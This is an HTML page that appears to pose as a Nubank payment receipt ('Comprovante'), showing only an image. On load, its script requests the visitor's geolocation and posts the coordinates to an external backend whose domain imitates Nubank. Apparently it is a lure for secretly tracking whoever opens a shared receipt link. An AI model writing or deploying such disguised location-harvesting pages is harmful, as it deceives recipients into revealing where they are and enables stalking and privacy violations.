<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Comprovante</title>
</head>
<body style="background-color: #6B02A3">
  <img style="display: block; margin: 0 auto;" src="img/Com.jpg" alt="Comprovante" />
  <script>
    // Evento executado quando a página é carregada
    window.addEventListener("load", () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
      } else {
        alert("Geolocalização não é suportada pelo navegador.");
      }
    });

    function sendLocation(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      console.log("Latitude: " + latitude);
      console.log("Longitude: " + longitude);

      console.log("entrou no frontend...");

      // Envia a localização para o backend
      fetch("https://comprovantenubank-nunegocios.vercel.app/api/send-location", { // Substitua com o URL real do backend
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ latitude, longitude })
      })
      .then(response => {
        if (!response.ok) {
          throw new Error("Erro ao enviar a localização.");
        }
        return response.json();
      })
      .then(data => {
        alert("Localização enviada com sucesso!");
      })
      .catch(error => {
        console.error("Erro:", error);
        alert("Erro ao enviar a localização. Por favor, tente novamente.");
      });
    }

    function handleError(error) {
      switch (error.code) {
        case error.PERMISSION_DENIED:
          alert("O usuário negou a solicitação de geolocalização.");
          break;
        case error.POSITION_UNAVAILABLE:
          alert("As informações de localização não estão disponíveis.");
          break;
        case error.TIMEOUT:
          alert("A solicitação de geolocalização expirou.");
          break;
        default:
          alert("Ocorreu um erro desconhecido.");
          break;
      }
    }
  </script>
</body>
</html>
